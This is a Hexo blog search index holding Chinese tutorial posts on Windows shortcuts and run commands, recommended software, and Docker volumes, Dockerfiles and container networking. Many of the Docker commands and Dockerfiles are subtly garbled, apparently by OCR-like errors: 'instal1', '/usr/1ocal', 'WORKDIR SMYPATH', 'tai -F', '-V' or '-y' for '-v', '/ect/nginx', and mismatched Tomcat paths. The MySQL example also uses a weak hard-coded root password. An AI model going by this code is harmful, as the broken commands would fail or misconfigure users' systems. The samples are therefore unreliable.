<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Basics</title>
    <url>/2023/07/26/Basics/</url>
    <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>

<h3 id="一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。"><a href="#一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。" class="headerlink" title="一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。"></a>一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。</h3><p>标准行为：<br>Windovws 文件系统将文件和目录名称视为不区分大小写。 FOO.txt 和 foo.txt 将被视为等效文件。<br>Linux 文件系统将文件和目录名称视为区分大小写。 FOO.txt 和 foo.txt 将被视为不同文件。</p>
<p>Windows 文件系统支持使用属性标志按目录设置区分大小写。 虽然标准行为是不区分大小写，但你可以分配属性标志来使目录区分大小写，以便它能够识别可能仅大小写不同的 Linux 文件和文件夹。<br>在将驱动器装载到适用于 Linux 的 Windows 子系统 (WSL) 文件系统时，尤其如此。 在 WSL 文件系统中工作时，运行的是 Linux，因此默认情况下，文件和目录被视为区分大小写。</p>
<h3 id="二、Windows-常用快捷键"><a href="#二、Windows-常用快捷键" class="headerlink" title="二、Windows 常用快捷键"></a>二、Windows 常用快捷键</h3><blockquote>
<p>1 保存 Ctrl + S 必用<br>2 复制 Ctrl + C<br>3 粘贴 Ctrl + V<br>4 剪切 Ctrl + X<br>5 撤销 Ctrl + Z<br>6 全选 Ctrl + A<br>7 显示桌面 Win + D<br>8 打开资源管理器（此电脑） Win + E<br>9 关闭窗口、浏览器标签 Ctrl + W<br>10 切换打开的程序窗口 Alt + Tab<br>11 新建文件夹 Ctrl + Shift + N<br>12 刷新 Ctrl + R<br>13【浏览器快捷键】恢复 Chrome 中刚被关掉的网页Ctrl + Shift + T<br>14【浏览器快捷键】地址栏搜索Ctrl + E<br>15【浏览器快捷键】全选地址栏内容Ctrl + L<br>16【浏览器快捷键】标签之间切换 Ctrl + Tab<br>17 删除文件（进回收站） Ctrl + D<br>18 彻底删除文件 Shift + Delete<br>19 打开任务管理器 Ctrl + Shift + Esc<br>20 锁定计算机 Win + L<br>21 打印 Ctrl + P<br>22 投影 Win + P<br>23 打开 Windows 常用功能列表 Win + X</p>
</blockquote>
<h3 id="三、Windows-运行命令"><a href="#三、Windows-运行命令" class="headerlink" title="三、Windows 运行命令"></a>三、Windows 运行命令</h3><table>
<thead>
<tr>
<th align="center">作用</th>
<th align="center">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">打开运行窗口</td>
<td align="center">Win + R</td>
</tr>
<tr>
<td align="center">打开运行窗口</td>
<td align="center">Win + R</td>
</tr>
<tr>
<td align="center">打开控制面板</td>
<td align="center">control</td>
</tr>
<tr>
<td align="center">打开计算器</td>
<td align="center">calc</td>
</tr>
<tr>
<td align="center">打开记事本</td>
<td align="center">notepad</td>
</tr>
<tr>
<td align="center">打开任务管理器</td>
<td align="center">taskmgr</td>
</tr>
<tr>
<td align="center">打开系统配置</td>
<td align="center">msconfig</td>
</tr>
<tr>
<td align="center">打开注册表</td>
<td align="center">regedit</td>
</tr>
<tr>
<td align="center">打开卸载程序界面</td>
<td align="center">appwiz.cpl</td>
</tr>
<tr>
<td align="center">打开防火墙设置</td>
<td align="center">firewall.cpl</td>
</tr>
<tr>
<td align="center">打开系统服务</td>
<td align="center">services.msc</td>
</tr>
<tr>
<td align="center">打开网络连接</td>
<td align="center">ncpa.cpl</td>
</tr>
<tr>
<td align="center">打开系统属性</td>
<td align="center">sysdm.cpl</td>
</tr>
<tr>
<td align="center">快速启动任务栏软件</td>
<td align="center">Win + （1 ~ 9）</td>
</tr>
<tr>
<td align="center">用命令关机</td>
<td align="center">shutdown -s -t 0</td>
</tr>
<tr>
<td align="center">用命令重启</td>
<td align="center">shutdown -r -t 0</td>
</tr>
<tr>
<td align="center">炫酷下滑关机</td>
<td align="center">slideToShutDown(在桌面新建“关机.txt”，在文件里输入 SlideToShutDown，再把 文件名改为“关 机.bat”，双击这个文件，自己看看效果~~~~)</td>
</tr>
</tbody></table>
<h3 id="四、必装软件"><a href="#四、必装软件" class="headerlink" title="四、必装软件"></a>四、必装软件</h3><ol>
<li><p>Everything：免费，本地硬盘文件极速搜索工具 （必用）<br>官网下载： <a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p>
</li>
<li><p>Wox：免费，效率神器 （必用）<br>百度搜索 Wox 下载或官网下载：<a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p>
</li>
<li><p>程序员必用：Markdown 工具（Typora 版本：v0.9.86） （必用）</p>
</li>
</ol>
<p>  Markdown 教程：<a href="https://www.runoob.com/markdown/md-tutorial.html">https://www.runoob.com/markdown/md-tutorial.html</a></p>
<ol start="4">
<li>Notepad++ ：免费，功能强大的文本编辑器 （常用）</li>
</ol>
<p>  官网下载：<a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p>
<ol start="5">
<li>VS Code：编程神器，可开发多种语言，多用于前端开发 （常用）</li>
</ol>
<p>  官网下载：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
<ol start="6">
<li>FDM：免费，非常棒的下载工具</li>
</ol>
<p>​       官网下载：<a href="https://www.freedownloadmanager.org/zh/download.htm">https://www.freedownloadmanager.org/zh/download.htm</a></p>
<ol start="7">
<li>Chrome、Firefox：程序员用的浏览器，调试 Web 前端 （必用）</li>
</ol>
<p>​        百度搜索：Chrome 下载、Firefox 下载</p>
]]></content>
      <tags>
        <tag>Windows常用快捷键</tag>
        <tag>Windows运行命令</tag>
        <tag>必备软件</tag>
      </tags>
  </entry>
  <entry>
    <title>Docke精髓</title>
    <url>/2023/08/01/Docke3/</url>
    <content><![CDATA[<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><span id="more"></span>

<p>什么是容器数据卷<br>功能：容器的持久化和同步操作   容器之间数据共享的技术!</p>
<p>卷技术：Docker 容器中产生的数据，同步到本地。目录的挂载，将我们容器内的目录，挂载到Linux上面</p>
<h2 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h2><p>方式一: 直接使用命令来挂载 -V</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -v 主机目录，容器内目录</span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line">[root@xxx]# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br><span class="line"></span><br><span class="line">启动起来时候我们可以通过 docker inspect 容器id</span><br></pre></td></tr></table></figure>

<h2 id="实战：安装MySQL"><a href="#实战：安装MySQL" class="headerlink" title="实战：安装MySQL"></a>实战：安装MySQL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取镜像</span><br><span class="line">docker search mysql</span><br><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">运行容器,需要做数据挂载</span><br><span class="line">安装启动mysql，需要配置密码（注意）</span><br><span class="line">官方测试：docker run -it --network some-network --rm mysql mysql -hsome-mysql -uexample-user -p</span><br><span class="line">运行</span><br><span class="line">-d 后台运行</span><br><span class="line">-p 端口映射</span><br><span class="line">-v 卷挂载</span><br><span class="line">-e 环境配置,设置mysql的密码</span><br><span class="line">--name 容器名字	</span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql.conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=88888888 --name mysql01 mysql:5.7</span><br><span class="line">启动成功之后，可以在Windows本地机测试创建一个数据库，查看我们映射的路径是否OK</span><br></pre></td></tr></table></figure>

<p>假设我们将容器删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f mysql01</span><br><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>回到宿主机查看，发现数据都还在！ 我们挂载到本地的数据卷没有丢失，这就实现了容器数据持久化功能。</p>
<h2 id="具名挂载和匿名挂载"><a href="#具名挂载和匿名挂载" class="headerlink" title="具名挂载和匿名挂载"></a>具名挂载和匿名挂载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匿名挂载</span><br><span class="line">-v 容器内路径</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line">查看所有数据卷的情况</span><br><span class="line">docker volume ls</span><br><span class="line"></span><br><span class="line">具名挂载(常用)</span><br><span class="line">-v 卷名:容器内路径</span><br><span class="line">[root@163 home]# docker run -d -P --name nginx02 -v juming-nginx:/ect/nginx nginx</span><br><span class="line">a4a6c63e6cbe798790bfee212da7dd56fdb533e5ac150e030a66655fa722168d</span><br><span class="line">[root@163 home]# docker volume ls</span><br><span class="line">DRIVER    VOLUME NAME</span><br><span class="line">local     juming-nginx</span><br><span class="line"></span><br><span class="line"># 所有docker容器内的卷，没有指定目录的情况下都是在/var/lib/docker/volumes/xxx/_data</span><br><span class="line"></span><br><span class="line">-v /宿主机路径:容器内路径 # 指定路径挂载</span><br></pre></td></tr></table></figure>

<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展:"></a>拓展:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过 -v 容器内路径:ro rw 改变读写权限</span><br><span class="line"></span><br><span class="line">ro    readonly  #只读  说明这个路径只能通过宿主机来操作，容器内部是无法操作!</span><br><span class="line">rw    readwrite #可读可写</span><br><span class="line"></span><br><span class="line"># 一旦这个了设置了容器权限，容器对我们挂载出来的内容就有限定了</span><br><span class="line">docker run -d -p --name nginx02 -V juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx02 -y juming-nginx:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure>



<h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><p>DockerFile就是用来构建docker镜像的构建文件</p>
<h2 id="命令脚本"><a href="#命令脚本" class="headerlink" title="命令脚本"></a>命令脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir docker-test-volume</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">cd docker-test-volume/</span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">通过下面这个脚本，可以生成镜像，镜像是一层一层的，脚本是一层层的命令，每一个命令都是一层</span><br><span class="line">vim dockerfile1</span><br><span class="line">写入：    </span><br><span class="line">    FROM centos</span><br><span class="line">	VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]</span><br><span class="line">	CMD echo &quot;----end----&quot;</span><br><span class="line">	CMD /bin/bash</span><br><span class="line">保存：	</span><br><span class="line">	ESC :wq</span><br><span class="line"></span><br><span class="line">查看dockerfile1</span><br><span class="line">cat dockerfile1</span><br><span class="line">docker build -f /home/docker-test-volume/docekrfile1 -t rich/centos:1.0 .</span><br></pre></td></tr></table></figure>

<h2 id="DockerFile指令"><a href="#DockerFile指令" class="headerlink" title="DockerFile指令"></a>DockerFile指令</h2><table>
<thead>
<tr>
<th>指令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>指定基础镜像</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像是谁写的，姓名+邮箱</td>
</tr>
<tr>
<td>RUN</td>
<td>镜像构建的时候需要运行的命令</td>
</tr>
<tr>
<td>ADD</td>
<td>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>镜像的工作目录</td>
</tr>
<tr>
<td>VOLUME</td>
<td>挂载的目录</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>暴露端口配置</td>
</tr>
<tr>
<td>CMD</td>
<td>指定这个容器启动的时候要运行的命令（只有最后一个会生效，可被替代）</td>
</tr>
<tr>
<td>EMTRYPOINT</td>
<td>指定这个容器启动的时候要运行的命令，可以追加命令</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>当构建一个被继承DockerFile，这个时候就会运行ONBUILD的指令，触发指令</td>
</tr>
<tr>
<td>COPY</td>
<td>功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</td>
</tr>
<tr>
<td>ENV</td>
<td>构建的时候设置环境变量</td>
</tr>
</tbody></table>
<h2 id="创建一个自己的centos"><a href="#创建一个自己的centos" class="headerlink" title="创建一个自己的centos"></a>创建一个自己的centos</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1 编写Dockerfile的文件</span><br><span class="line">[root@xxx dockerfile]# cat mydockerfile-centos</span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER xxx&lt;xxxxxxx@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/1ocal</span><br><span class="line">WORKDIR SMYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y instal1 vim</span><br><span class="line">RUN yum -y insta11 net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD echo SMYPATH</span><br><span class="line">CMD echo &quot;----end----&quot;</span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"># 2、通过这个文件构建镜像</span><br><span class="line"># 命令 docker build -f dockerfile文件路径 -t 镜像名:[tag] .</span><br><span class="line">Successfu11y built e2bd75cfe070</span><br><span class="line">Successfu11y tagged mycentos :0.1</span><br><span class="line"></span><br><span class="line">#查看镜像历史，变更记录docker history 镜像id</span><br></pre></td></tr></table></figure>

<h2 id="实战：Tomcat镜像"><a href="#实战：Tomcat镜像" class="headerlink" title="实战：Tomcat镜像"></a>实战：Tomcat镜像</h2><p>1.准备镜像文件 tomcat 压缩包，jdk的压缩包</p>
<p>2.编写dockerfile文件，官方命名Dockerfile，build 会自动寻找这个文件，就不需要 -f指定了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">MAINTAINER xxx&lt;xxxxxx @qq.com&gt;</span><br><span class="line">COPY readme.txt /usr/local/readme.txt</span><br><span class="line"></span><br><span class="line">ADD jdk-8u11-linux-x64.tar.gz /usr/local/</span><br><span class="line"></span><br><span class="line">ADD apache-tomcat-9.0.22.tar.gz /usr/1ocal/</span><br><span class="line"></span><br><span class="line">RUN yum -y instal1 vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR SMYPATH</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_11</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.22</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tai -F /usr/local/apache-tomcat-9.0.22/logs/catalina.out</span><br></pre></td></tr></table></figure>

<p>3.构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t diytomcat .</span><br></pre></td></tr></table></figure>

<p>4.启动镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9090:8080 --name xuantomcat -v /home/xuan/build/tomcat/test:/usr/local/apache-tomcate-9.0.22/webapps/test/ -v /home/xuan/build/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.11/logs diytomcat</span><br></pre></td></tr></table></figure>

<p>5.访问测试<br>6.发布项目(由于做了卷挂载，我们直接在本地编写项目就可以发布了)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0”encoding=&quot;</span>UTF-8<span class="string">&quot;?&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">	&lt;web-app xmlns=&quot;</span>http://java. sun.com/xml/ns/javaee<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">	xmlns:xsi=&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">	xsi:schemaLocation=&quot;</span>http://java.sun.com/xml/ns/javaee</span></span><br><span class="line"><span class="meta">	      				http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">	version=&quot;</span>2.5<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;/web-app&gt;</span></span></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;xxxxxxxx&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello World!&lt;br/&gt;</span><br><span class="line">&lt;%</span><br><span class="line">System.out.println(&quot;welcome&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="发布镜像到DockerHub"><a href="#发布镜像到DockerHub" class="headerlink" title="发布镜像到DockerHub"></a>发布镜像到DockerHub</h2><p>1、地址 <a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册自己的账号<br>2、确定这个这账号可以登录<br>3、在我们服务器上提交自己的镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker login --help</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-p，--password string     Password   </span><br><span class="line">    --password-stdin      Take the password from stdin</span><br><span class="line">-u，--username string     Username</span><br></pre></td></tr></table></figure>

<p>4、登录完毕后就可以提交镜像了，就是一步 docker push  xxx&#x2F;diytomcat:1.0(一定要带版本号)</p>
<p>docker tag 镜像id  要改成的名字：标签（1.0…..）</p>
<h2 id="发布镜像到阿里云容器服务"><a href="#发布镜像到阿里云容器服务" class="headerlink" title="发布镜像到阿里云容器服务"></a>发布镜像到阿里云容器服务</h2><p>1、登录阿里云<br>2、找到容器镜像服务<br>3、创建命名空间<br>4、创建容器镜像<br>5、浏览阿里云（参考官方）</p>
<h1 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h1><h2 id="理解docker0"><a href="#理解docker0" class="headerlink" title="理解docker0"></a>理解docker0</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lo:本机回环地址</span><br><span class="line"></span><br><span class="line">eth0:阿里云内网地址</span><br><span class="line"></span><br><span class="line">docker0:docker0地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># [root@kuangshen /]# docker run -d -p --name tomcat01 tomcat</span><br><span class="line">#查看容器的内部网络地址 ip addr， 发现容器启动的时候会得到一个 etho@if262 ip地址，docker分配的![root@kuangshen /]# docker exec -it tomcat01 ip addr</span><br><span class="line">1: 1o: &lt;LOOPBACKUP,LOWER_UP&gt; mtu 65536 gdisc noqueue state UNKNOWN group default glen 1000</span><br><span class="line">   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">   inet 127.0.0.1/8 scope host lo</span><br><span class="line">   valid_lft forever preferred_lft forever</span><br><span class="line">261: etho@if262:&lt;BROADCAST,MULTICAST,UP,LOWER-UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">     inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0</span><br><span class="line">     valid_lft forever preferred_lft forever</span><br><span class="line"># linux 可以ping 通 docker 容器内部</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 我们发现这个容器带来网卡，都是一对对的</span><br><span class="line"># evth-pair 就是一对的虚拟设备接口，他们都是成对出现的，一段连着协议，一段彼此相连</span><br><span class="line"># 正因为有这个特性，evth-pair 充当一个桥梁，连接各种虚拟网络设备的</span><br><span class="line"># OpenStac，Docker容器之间的连接，OVS的连接，都是使用 evth-pair 技术</span><br><span class="line">结论:容器和容器之间是可以互相ping通的</span><br></pre></td></tr></table></figure>

<p>网络模型图</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230802140826087.png" alt="image-20230802140826087"></p>
<p>结论: tomcat01和tomcat02 是公用的一个路由器，docker0。</p>
<p>所有的容器不指定网络的情况下，都是 docker0 路由的，docker会给我们的容器分配一个默认的可用IP</p>
<p>小结</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230802141506485.png" alt="image-20230802141506485"></p>
<p>Docker容器内的所有网络接口都是虚拟的，虚拟的转发效率高（内网传递文件）</p>
<p>只有容器删除，对应的网桥一对就没有了</p>
<h2 id="容器互联–link"><a href="#容器互联–link" class="headerlink" title="容器互联–link"></a>容器互联–link</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思考一个场景，我们编写了一个微服务，database url=ip:，项目不重启，数据库ip换掉了，怎样可以用名字来进行访问容器</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker exec -it tomcat02 ping tomcat01</span><br><span class="line">ping: tomcat01: Name or service not known</span><br><span class="line">#通过--1ink 可以解决了网络连通问题</span><br><span class="line"># docker run -d -p -name tomcat03 --link tomcat02  tomcat</span><br><span class="line"># docker exec -it tomcat03 ping tomcat02(可以ping通)</span><br><span class="line">#反向不可以ping通</span><br><span class="line"># docker exec -it tomcat02 ping tomcat03</span><br><span class="line">ping: tomcat03: Name or service not known</span><br></pre></td></tr></table></figure>

<p>本质探究:-link 就是我们在hosts配置中增加了一个172.18.0.3tomcat02</p>
<p>不建议使用 –link,适合新手用<br>docker0问题:不支持容器名连接访问</p>
<h2 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h2><p>查看所有的docker网络#docker network ls</p>
<p>网络模式</p>
<p>bridge:桥接docker(默认，自己创建也用bridge模式)</p>
<p>none:不配置网络</p>
<p>host:和宿主机共享网络</p>
<p>container:容器网络连通(用的比较少)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#我们直接启动的命令 --net bridge，而这个就是docker0</span><br><span class="line">docker run -d -P --name tomcat0l tomcat</span><br><span class="line">docker run -d -P --name tomcat0l --net bridge tomcat</span><br><span class="line"># docker0特点: 默认，域名不能访问，--link可以打通连接!</span><br><span class="line">#我们可以自定义一个网络!</span><br><span class="line"># --driver bridge</span><br><span class="line">--subnet 192.168.0.0/16</span><br><span class="line"># --gateway 192.168.0.1</span><br><span class="line"># docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">#直接ping ip 可以ping通</span><br><span class="line">docker exec -it tomcat-net-01 ping 192.168.0.3</span><br><span class="line">#现在不使用--link也可以ping名字</span><br><span class="line">docker exec -it tomcat-net-01 ping tomcat-net-02</span><br></pre></td></tr></table></figure>

<h2 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network --help</span><br><span class="line">docker network connect --help</span><br><span class="line">测试打通 tomcat01 - mynet</span><br><span class="line"># docker network connect mynet tomcat01</span><br><span class="line">连通之后就是将 tomcat01 放到了 mynet 网络下</span><br><span class="line">一个容器两个ip地址!</span><br><span class="line"># 阿里云服务:公网ip 私网ip</span><br><span class="line"></span><br><span class="line">docker exec -it tomcat01 ping tomcat-net-01//连通</span><br></pre></td></tr></table></figure>

<p>假设要跨网络操作别人，就需要使用docker network connect连通</p>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2023/07/30/Docker/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>

<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><p>Docker是一个开源平台，通过将应用程序隔离到轻量级、可移植的容器中，自动化应用程序的部署、扩展和管理。容器是独立的可执行单元，封装了运行应用程序所需的所有必要依赖项、库和配置文件，可以在各种环境中稳定地运行。</p>
<p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<p>隔离：docker核心思想！</p>
<p>docker的思想来源于集装箱</p>
<p>docker  十分轻巧！！！</p>
<p>基于Go语言开发的，开源项目！</p>
<p>虚拟机也是属于虚拟化技术，Docker 容器技术，也是一种 虚拟化技术!</p>
<ul>
<li>Vm:     linux centos原生镜像 (一个电脑!) 隔离，需要开启多个虚拟机!                        几个G                      几分钟</li>
<li>docker:隔离,境像(最核心的环境 4m + jdk + mysql)十分的小巧， 运行像就可以了! 小巧! 几个M KB秒级启动!</li>
</ul>
<p><strong>虚拟机技术缺点:</strong><br>1、资源占用十分多<br>2、冗余步骤多<br>3、启动很慢 !<br><strong>容器化技术</strong><br><strong><code>容器化技术不是模拟的一个完整的提作系统</code></strong></p>
<p><strong>比较Docker 和 虚拟机技术的不同:</strong></p>
<ul>
<li>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件</li>
<li>容器内的应用直接运行在 宿主机的内容，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便</li>
<li>每个容器间是互相隔离，每个容器内都有一个属于自己的文件系统，互不影响。</li>
</ul>
<p>官网: <a href="https://www.docker.com/">https://www.docker.com/</a></p>
<p>文档地址: <a href="https://docs.docker.com/">https://docs.docker.com/</a> (超级详细)</p>
<p>仓库地址: <a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h2 id="容器和Docker"><a href="#容器和Docker" class="headerlink" title="容器和Docker"></a><strong>容器和Docker</strong></h2><p>Docker是一种简化创建、部署和管理容器的平台。它为开发人员和管理员提供了一组工具和API，用于管理容器化的应用程序。使用Docker，您可以将应用程序代码、库和依赖项构建和打包成一个容器映像，该映像可以在支持Docker的任何环境中分发和一致地运行。</p>
<h2 id="容器的必要性"><a href="#容器的必要性" class="headerlink" title="容器的必要性"></a><strong>容器的必要性</strong></h2><p><strong>应用更快速的交付和部署</strong><br>传统:一堆帮助文档，安装程序<br>Docker: 打包镜像发布测试，一键运行<br><strong>更便捷的升级和扩缩容</strong><br>使用了Docker之后，我们部署应用就和搭积木一样!<br>项目打包为一个镜像，扩展 服务器A ! 服务器B</p>
<p><strong>更简单的系统运维</strong><br>在容器化之后，我们的开发，测试环境都是高度一致的。</p>
<p><strong>更高效的计算资源利用</strong></p>
<p>Docker 是 内核级别的虚拟化，可以在一个物理机上可以运行很多的客器实例!服务器的性能可以被压榨到极致.</p>
<h1 id="Docker-的基本组成"><a href="#Docker-的基本组成" class="headerlink" title="Docker 的基本组成"></a>Docker 的基本组成</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/be7adea748abd28eee7d4ec814b7a316.jpeg" alt="img"></p>
<p><strong>镜像(image )</strong> :<br>docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，tomcat镜像&#x3D;&#x3D;&#x3D;&gt; run &#x3D;&#x3D;&gt; tomcat01 容器(提供服务器)通过这个镜像可以创建多个容器( 最终服务运行或者项目运行就是在容器中的)。<br><strong>容器(container) :</strong><br>Docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的</p>
<p>启动，停止，删除，基本命令!</p>
<p>目前就可以把这个容器理解为就是一个简易的linux系统</p>
<p><strong>仓库(repository) :</strong><br>仓库就是存放镜像的地方!<br>仓库分为公有仓库和私有仓库!<br>Docker Hub(默认是国外的)   阿里云….都有容器服务器(配置镜像加速 !)</p>
<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><p><strong>环境准备</strong></p>
<ol>
<li>Linux基础</li>
<li>CentOS 7或以上版本</li>
<li>使用Xshell连接远程服务器进行操作</li>
</ol>
<p><strong>环境查看</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#系统内核是3.10以上</span><br><span class="line">用uname -r查看</span><br></pre></td></tr></table></figure>

<p>系统版本</p>
